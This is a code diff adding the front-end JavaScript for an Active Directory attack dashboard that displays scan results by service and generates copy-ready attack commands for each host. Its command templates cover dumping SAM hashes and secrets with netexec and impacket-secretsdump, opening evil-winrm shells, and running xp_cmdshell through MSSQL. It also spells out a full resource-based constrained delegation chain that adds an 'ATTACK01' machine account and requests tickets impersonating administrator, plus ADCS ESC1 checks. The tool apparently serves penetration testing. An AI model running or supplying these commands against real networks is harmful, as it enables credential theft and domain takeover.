+          ${c.local_admin?`<div class="cmd"><pre>netexec smb ${esc(c.ip)} -u ${esc((D.meta||{}).scanned_by||'user')} -p 'PASSWORD' --sam\nimpacket-secretsdump ${esc((D.meta||{}).domain||'DOMAIN')}/${esc((D.meta||{}).scanned_by||'user')}:'PASSWORD'@${esc(c.ip)}</pre><button class="cpbtn" onclick="cp('${enc(`netexec smb ${c.ip} -u ${(D.meta||{}).scanned_by||'user'} -p 'PASSWORD' --sam`)}',this)">copy</button></div>`:''}
+        </div>
+      </td>
+    </tr>`;
+  }).join('');
+}
+
+// ── WinRM Page ────────────────────────────────────────────────────────────────
+function renderWinRM() {
+  const comps = D.computers||[];
+  const q = (document.getElementById('winrmSearch')||{}).value||'';
+  let rows = comps.filter(c => c.winrm && c.winrm.available);
+  if (q) rows = rows.filter(c=>(c.hostname||'').toLowerCase().includes(q.toLowerCase())||(c.ip||'').includes(q));
+
+  rows.sort((a,b) => {
+    if (svcSort.winrm.adminFirst) {
+      if (a.winrm.local_admin && !b.winrm.local_admin) return -1;
+      if (!a.winrm.local_admin && b.winrm.local_admin) return 1;
+      if (a.winrm.auth && !b.winrm.auth) return -1;
+      if (!a.winrm.auth && b.winrm.auth) return 1;
+    }
+    return (a.hostname||'').localeCompare(b.hostname||'');
+  });
+
+  document.getElementById('winrm-count').textContent = rows.length + ' host' + (rows.length!==1?'s':'');
+  const tbody = document.getElementById('winrmTbody');
+  if (!rows.length) { tbody.innerHTML=`<tr><td colspan="7" class="no-data">No WinRM hosts found.</td></tr>`; return; }
+
+  tbody.innerHTML = rows.map((c,i) => {
+    const w = c.winrm||{};
+    const authHtml   = w.auth        ? `<span class="badge b-auth">● YES</span>`   : `<span class="b-no">no</span>`;
+    const adminHtml  = w.local_admin ? `<span class="badge b-admin">● LOCAL ADMIN</span>` : (w.auth ? `<span class="badge b-auth">auth only</span>` : `<span class="b-no">no</span>`);
+    const uid = 'winrm-'+i;
+    return `<tr class="${w.local_admin?'row-admin':''}" onclick="toggleRow('${uid}',this)" style="cursor:pointer">
+      <td><strong>${esc(c.hostname||'?')}</strong><div style="font-size:10px;color:var(--text3)">${esc(c.dns_name||'')}</div></td>
+      <td style="font-family:var(--mono);color:var(--blue)">${esc(c.ip||'—')}</td>
+      <td style="color:var(--text2)">${esc(c.os||'—')}</td>
+      <td><span class="badge b-open">:${w.port} ${w.proto}</span></td>
+      <td>${authHtml}</td>
+      <td>${adminHtml}</td>
+      <td style="text-align:right;color:var(--text3);font-size:11px" id="chev-${uid}">▼</td>
+    </tr>
+    <tr class="exp-row" id="exp-${uid}" style="display:none">
+      <td colspan="7">
+        <div class="exp-inner">
+          <div style="font-size:12px;color:var(--text2);margin-bottom:10px">
+            WinRM ${w.proto} on port ${w.port} |
+            ${w.local_admin?'<span style="color:var(--red)">● Local admin confirmed</span>':w.auth?'<span style="color:var(--green)">● Authenticated (not local admin)</span>':'<span style="color:var(--text3)">○ Port open, auth status unknown</span>'}
+          </div>
+          ${w.local_admin||w.auth?`<div class="cmd"><pre>evil-winrm -i ${esc(c.ip)} -u ${esc((D.meta||{}).scanned_by||'user')} -p 'PASSWORD'</pre><button class="cpbtn" onclick="cp('${enc(`evil-winrm -i ${c.ip} -u ${(D.meta||{}).scanned_by||'user'} -p 'PASSWORD'`)}',this)">copy</button></div>`:''}
+        </div>
+      </td>
+    </tr>`;
+  }).join('');
+}
+
+// ── MSSQL Page ────────────────────────────────────────────────────────────────
+function renderMSSQL() {
+  const comps = D.computers||[];
+  const q = (document.getElementById('mssqlSearch')||{}).value||'';
+  let rows = comps.filter(c => c.mssql && c.mssql.available);
+  if (q) rows = rows.filter(c=>(c.hostname||'').toLowerCase().includes(q.toLowerCase())||(c.ip||'').includes(q));
+
+  rows.sort((a,b) => {
+    if (svcSort.mssql.adminFirst) {
+      if (a.mssql.sysadmin && !b.mssql.sysadmin) return -1;
+      if (!a.mssql.sysadmin && b.mssql.sysadmin) return 1;
+      if (a.mssql.auth && !b.mssql.auth) return -1;
+      if (!a.mssql.auth && b.mssql.auth) return 1;
+    }
+    return (a.hostname||'').localeCompare(b.hostname||'');
+  });
+
+  document.getElementById('mssql-count').textContent = rows.length + ' host' + (rows.length!==1?'s':'');
+  const tbody = document.getElementById('mssqlTbody');
+  if (!rows.length) { tbody.innerHTML=`<tr><td colspan="6" class="no-data">No MSSQL hosts found.</td></tr>`; return; }
+
+  tbody.innerHTML = rows.map((c,i) => {
+    const m = c.mssql||{};
+    const authHtml    = m.auth     ? `<span class="badge b-auth">● YES</span>`    : `<span class="b-no">no</span>`;
+    const sysHtml     = m.sysadmin ? `<span class="badge b-sysadmin">● SYSADMIN</span>` : (m.auth?`<span class="badge b-auth">auth only</span>`:`<span class="b-no">no</span>`);
+    const uid = 'mssql-'+i;
+    return `<tr class="${m.sysadmin?'row-admin':''}" onclick="toggleRow('${uid}',this)" style="cursor:pointer">
+      <td><strong>${esc(c.hostname||'?')}</strong><div style="font-size:10px;color:var(--text3)">${esc(c.dns_name||'')}</div></td>
+      <td style="font-family:var(--mono);color:var(--blue)">${esc(c.ip||'—')}</td>
+      <td style="color:var(--text2)">${esc(c.os||'—')}</td>
+      <td>${authHtml}</td>
+      <td>${sysHtml}</td>
+      <td style="text-align:right;color:var(--text3);font-size:11px" id="chev-${uid}">▼</td>
+    </tr>
+    <tr class="exp-row" id="exp-${uid}" style="display:none">
+      <td colspan="6">
+        <div class="exp-inner">
+          <div style="font-size:12px;color:var(--text2);margin-bottom:10px">
+            MSSQL :1433 |
+            ${m.sysadmin?'<span style="color:var(--red)">● Sysadmin confirmed</span>':m.auth?'<span style="color:var(--green)">● Authenticated (not sysadmin)</span>':'<span style="color:var(--text3)">○ Port open, auth failed</span>'}
+            ${m.error?` | <span style="color:var(--text3)">Error: ${esc(m.error)}</span>`:''}
+          </div>
+          ${m.auth?`<div class="cmd"><pre>impacket-mssqlclient ${esc((D.meta||{}).domain||'DOMAIN')}/${esc((D.meta||{}).scanned_by||'user')}:'PASSWORD'@${esc(c.ip)} -windows-auth${m.sysadmin?'\n# Sysadmin — try xp_cmdshell:\nEXEC xp_cmdshell "whoami"':''}</pre><button class="cpbtn" onclick="cp('${enc(`impacket-mssqlclient ${(D.meta||{}).domain||'DOMAIN'}/${(D.meta||{}).scanned_by||'user'}:'PASSWORD'@${c.ip} -windows-auth`)}',this)">copy</button></div>`:''}
+        </div>
+      </td>
+    </tr>`;
+  }).join('');
+}
+
+// ── Row expand ────────────────────────────────────────────────────────────────
+function toggleRow(uid, tr) {
+  const exp  = document.getElementById('exp-'+uid);
+  const chev = document.getElementById('chev-'+uid);
+  if (!exp) return;
+  const open = exp.style.display === 'none';
+  exp.style.display = open ? '' : 'none';
+  if (chev) chev.textContent = open ? '▲' : '▼';
+}
+
+// ── Users ─────────────────────────────────────────────────────────────────────
+function renderUsers() { renderUserTable(allUsers); }
+function renderUserTable(users) {
+  document.getElementById('user-count').textContent = users.length+' users';
+  const FC={'ACCOUNT_DISABLED':'flag-gray','PASSWD_NOTREQD':'flag-amber','DONT_REQUIRE_PREAUTH':'flag-red','TRUSTED_FOR_DELEGATION':'flag-red','TRUSTED_TO_AUTH_FOR_DELEGATION':'flag-red','PASSWORD_EXPIRED':'flag-amber','LOCKOUT':'flag-red'};
+  document.getElementById('userTbody').innerHTML = users.map(u => {
+    const flags=(u.flags||[]).map(f=>`<span class="flag ${FC[f]||'flag-gray'}">${f.replace(/_/g,' ')}</span>`).join('');
+    const spns=(u.spns||[]).length?`<div style="font-size:11px;color:var(--blue)">${u.spns.slice(0,2).map(s=>esc(s)).join('<br>')}${u.spns.length>2?`<br>+${u.spns.length-2} more`:''}</div>`:'—';
+    return `<tr><td><strong>${esc(u.sam)}</strong></td><td style="color:var(--text2)">${esc(u.display_name||'')}</td><td>${flags||'—'}</td><td>${spns}</td><td style="color:var(--amber);font-size:11px">${esc(u.description||'')}</td></tr>`;
+  }).join('')||`<tr><td colspan="5" class="no-data">No users</td></tr>`;
+}
+function filterUsers(){const q=document.getElementById('userSearch').value.toLowerCase();renderUserTable(q?allUsers.filter(u=>(u.sam||'').toLowerCase().includes(q)||(u.display_name||'').toLowerCase().includes(q)||(u.description||'').toLowerCase().includes(q)):allUsers);}
+
+// ── Groups ────────────────────────────────────────────────────────────────────
+function renderGroups() {
+  const g=D.group_members||{};
+  document.getElementById('groupGrid').innerHTML=Object.entries(g).length===0?'<div class="no-data">No group data.</div>':
+    Object.entries(g).map(([grp,members])=>`<div class="group-card"><div class="group-name">${esc(grp)} <span style="font-size:10px;color:var(--text3)">(${members.length})</span></div>${members.map(m=>`<div class="group-member">${esc(m)}</div>`).join('')||'<div style="font-size:11px;color:var(--text3);font-style:italic">empty</div>'}</div>`).join('');
+}
+
+// ── RBCD ──────────────────────────────────────────────────────────────────────
+function renderRBCD() {
+  const rbcd = D.rbcd || {};
+  const meta = D.meta || {};
+  let html = '';
+
+  // MachineAccountQuota
+  const maq = rbcd.machine_quota ?? 0;
+  html += `<div class="sh">addcomputer.py Viability</div>`;
+  if (rbcd.can_add_computer) {
+    html += `<div class="rbcd-card warn">
+      <div class="rbcd-title" style="color:var(--amber)">✓ Can Add Computer Accounts (MachineAccountQuota = ${maq})</div>
+      <div class="rbcd-detail">Your user can add up to ${maq} machine account(s) to the domain. This is the prerequisite for RBCD attacks — you own the attacker computer, you just need GenericWrite on a target computer to configure delegation.</div>
+      <div class="cmd"><pre>impacket-addcomputer ${esc(meta.domain||'DOMAIN')}/${esc(meta.scanned_by||'user')}:'PASSWORD' -dc-ip ${esc(meta.dc_ip||'DC-IP')} -computer-name ATTACK01 -computer-pass 'Attack01!2024'</pre><button class="cpbtn" onclick="cp('${enc(`impacket-addcomputer ${meta.domain||'DOMAIN'}/${meta.scanned_by||'user'}:'PASSWORD' -dc-ip ${meta.dc_ip||'DC-IP'} -computer-name ATTACK01 -computer-pass 'Attack01!2024'`)}',this)">copy</button></div>
+    </div>`;
+  } else {
+    html += `<div class="rbcd-card ok">
+      <div class="rbcd-title">✗ Cannot Add Computer Accounts (MachineAccountQuota = ${maq})</div>
+      <div class="rbcd-detail">MachineAccountQuota is 0 — your user cannot add machine accounts via the default quota. RBCD via addcomputer.py is not possible unless you have CreateChild rights on a specific OU.</div>
+    </div>`;
+  }
+
+  // Existing RBCD
+  if ((rbcd.existing_rbcd||[]).length > 0) {
+    html += `<div class="sh" style="margin-top:16px">Existing RBCD Configured</div>`;
+    html += `<div class="rbcd-card vuln">
+      <div class="rbcd-title" style="color:var(--red)">⚠ msDS-AllowedToActOnBehalfOfOtherIdentity set on ${rbcd.existing_rbcd.length} object(s)</div>
+      <div class="rbcd-detail">${rbcd.existing_rbcd.map(x=>esc(String(x))).join(', ')}<br><br>These objects already have RBCD configured — if your user controls the delegating account, you can impersonate any user to these services.</div>
+      <div class="cmd"><pre>impacket-getST -spn cifs/${esc(String(rbcd.existing_rbcd[0]))} ${esc(meta.domain||'DOMAIN')}/${esc(meta.scanned_by||'user')}:'PASSWORD' -impersonate administrator -dc-ip ${esc(meta.dc_ip||'DC-IP')}</pre><button class="cpbtn" onclick="cp('${enc(`impacket-getST -spn cifs/${String(rbcd.existing_rbcd[0])} ${meta.domain||'DOMAIN'}/${meta.scanned_by||'user'}:'PASSWORD' -impersonate administrator -dc-ip ${meta.dc_ip||'DC-IP'}`)}',this)">copy</button></div>
+    </div>`;
+  }
+
+  // T2A4D (Protocol Transition / Constrained delegation users)
+  const t2a4d = rbcd.t2a4d_users||[];
+  if (t2a4d.length > 0) {
+    html += `<div class="sh" style="margin-top:16px">Constrained Delegation (T2A4D / Protocol Transition)</div>`;
+    html += t2a4d.map(u => {
+      const svc = (u.delegates_to||[])[0]||'TARGET-SPN';
+      const cmd = `impacket-getST -spn ${svc} -impersonate administrator ${meta.domain||'DOMAIN'}/${u.sam}:'PASSWORD' -dc-ip ${meta.dc_ip||'DC-IP'}`;
+      return `<div class="rbcd-card vuln">
+        <div class="rbcd-title" style="color:var(--red)">${esc(u.sam)} — T2A4D (can impersonate any user)</div>
+        <div class="rbcd-detail">Delegates to: ${(u.delegates_to||[]).map(s=>esc(s)).join(', ')}<br>T2A4D allows impersonating <strong>any</strong> user (including DA) to the delegated SPNs — no Kerberos pre-auth needed from the target user.</div>
+        <div class="cmd"><pre>${esc(cmd)}</pre><button class="cpbtn" onclick="cp('${enc(cmd)}',this)">copy</button></div>
+      </div>`;
+    }).join('');
+  }
+
+  // Full RBCD attack chain if both viable
+  if (rbcd.can_add_computer && (rbcd.unconstrained_hosts||[]).length > 0) {
+    const tgt = rbcd.unconstrained_hosts[0];
+    const cmd = `# Step 1 — Add attacker computer\nimpacket-addcomputer ${meta.domain||'DOMAIN'}/${meta.scanned_by||'user'}:'PASSWORD' -dc-ip ${meta.dc_ip||'DC-IP'} -computer-name ATTACK01 -computer-pass 'Attack01!2024'\n\n# Step 2 — Set RBCD on target (needs GenericWrite on ${tgt})\npython3 rbcd.py -f ATTACK01 -t ${tgt} -dc-ip ${meta.dc_ip||'DC-IP'} ${meta.domain||'DOMAIN'}/${meta.scanned_by||'user'}:'PASSWORD'\n\n# Step 3 — Get ST impersonating DA\nimpacket-getST -spn cifs/${tgt} ${meta.domain||'DOMAIN'}/ATTACK01:'Attack01!2024' -impersonate administrator -dc-ip ${meta.dc_ip||'DC-IP'}`;
+    html += `<div class="sh" style="margin-top:16px">Full RBCD Attack Chain</div>`;
+    html += `<div class="rbcd-card vuln">
+      <div class="rbcd-title" style="color:var(--red)">RBCD via Unconstrained Delegation Host — ${esc(tgt)}</div>
+      <div class="rbcd-detail">Full chain: add computer → set RBCD → getST → pass-the-ticket.</div>
+      <div class="cmd"><pre>${esc(cmd)}</pre><button class="cpbtn" onclick="cp('${enc(cmd)}',this)">copy</button></div>
+    </div>`;
+  }
+
+  if (!html) html = '<div class="no-data">No RBCD data. Run the latest scanner.py.</div>';
+  document.getElementById('rbcdContent').innerHTML = html;
+}
+
+// ── ADCS ──────────────────────────────────────────────────────────────────────
+function renderAdcs() {
+  const cas=D.adcs_cas||[], vulns=D.adcs_vulns||[], meta=D.meta||{};
+  let html='';
+  if (!cas.length) {
+    html += `<div class="adcs-safe"><div class="adcs-title">No Certificate Authority Found</div><div class="adcs-detail">No ADCS enrollment service detected in the domain.</div></div>`;
+  } else {
+    html += `<div class="sh">Certificate Authorities (${cas.length})</div>`;
+    html += cas.map(ca=>`<div class="trust-card"><div class="trust-name">${esc(ca.name)}</div><div class="trust-meta">Host: ${esc(ca.host)} | Templates: ${(ca.templates||[]).length}</div></div>`).join('');
+  }
+  if (vulns.length>0) {
+    html += `<div class="sh" style="margin-top:16px">ESC1 Vulnerable Templates (${vulns.length})</div>`;
+    html += vulns.map(v=>`<div class="adcs-vuln"><div class="adcs-title">⚠ ${esc(v.template)} — ${esc(v.type)}</div><div class="adcs-detail">${esc(v.detail)}</div><div class="cmd"><pre>${esc(v.command)}</pre><button class="cpbtn" onclick="cp('${enc(v.command)}',this)">copy</button></div></div>`).join('');
+    html += `<div style="margin-top:10px;padding:10px 14px;background:var(--bg2);border:1px solid var(--border);border-radius:6px;font-size:12px;color:var(--text2)">Run <code>certipy find -u ${esc(meta.scanned_by||'user')}@${esc(meta.domain||'domain')} -p PASSWORD -dc-ip ${esc(meta.dc_ip||'')} -vulnerable -stdout</code> for full ESC1–ESC8.</div>`;
+  } else if (cas.length>0) {
+    html += `<div class="adcs-safe" style="margin-top:12px"><div class="adcs-title">No ESC1 Templates Detected</div><div class="adcs-detail">Basic ESC1 check passed. Run certipy for a full ESC1–ESC8 audit.</div></div>`;
+  }
+  document.getElementById('adcsContent').innerHTML = html||'<div class="no-data">No ADCS data.</div>';
+}
+
+// ── Nav / utils ───────────────────────────────────────────────────────────────
+function nav(name) {
+  document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
+  document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
+  const pg=document.getElementById('page-'+name), nv=document.getElementById('nav-'+name);
+  if (pg) pg.classList.add('active');
+  if (nv) nv.classList.add('active');
+  if (!D) document.getElementById('load-screen').style.display='flex';
+}
+function cp(encoded,btn){navigator.clipboard.writeText(decodeURIComponent(encoded)).then(()=>{btn.textContent='✓';setTimeout(()=>btn.textContent='copy',1200);});}
+function enc(s){return encodeURIComponent(s);}
+function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
+</script>
+</body>
+</html>
